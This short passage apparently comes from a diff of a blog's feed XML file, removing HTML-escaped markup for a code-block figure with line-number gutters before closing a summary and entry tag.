-      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;
-    
-    </summary>
-    
     
   </entry>
   
